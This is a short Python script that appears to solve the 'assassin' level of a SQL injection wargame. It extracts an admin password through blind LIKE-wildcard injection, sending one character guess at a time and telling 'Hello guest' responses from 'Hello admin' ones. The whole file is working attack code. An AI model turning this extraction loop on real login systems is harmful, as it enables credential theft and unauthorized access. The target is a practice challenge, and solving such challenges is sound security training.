import requests
import os

URL_ID=os.environ['URL_ID']
PHPSESSID=os.environ['PHPSESSID']

url = f"https://los.rubiya.kr/chall/assassin_{URL_ID}.php"
cookie = {'PHPSESSID': PHPSESSID}

pw_list = [""]
length = 1
admin_pw = ""
while admin_pw == "":
    next_pw_list = []
    for pw in pw_list:
        for c in "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ":
            res = requests.get(url, params={'pw':f"{pw}{c}%"},cookies=cookie)
            if res.text.find("Hello guest") > 0:
                found_pw = f"{pw}{c}"
                next_pw_list.append(found_pw)
                print(f"(in progress) (found) {found_pw}")
            elif res.text.find("Hello admin") > 0:
                print(f"(in progress) (found ADMIN) {pw}{c}")
                admin_pw = f"{pw}{c}"
                break
    pw_list = next_pw_list

res = requests.get(url, params={'pw':f'{admin_pw}%'},cookies=cookie)

if res.text.find("Clear") > 0:
    print("Clear!")
else:
    print("Failed")